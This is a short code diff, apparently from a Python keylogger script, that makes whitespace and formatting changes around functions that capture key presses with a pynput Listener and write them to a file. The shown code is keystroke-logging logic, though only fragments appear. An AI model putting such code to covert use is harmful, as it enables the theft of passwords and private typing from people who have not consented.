@@ -26,8 +26,9 @@ def write_file(keys):
              f.write('\t')
             elif k.find("Key") == -1:
                 f.write(k)
+
             q = str(key).replace("'", "")
-            if k.find("enter")>0:
+            if k.find("enter") > 0:
                 f.write('\n')
             elif q.find("Key") == 1:
                 f.write(q)
@@ -39,5 +40,6 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
 
 
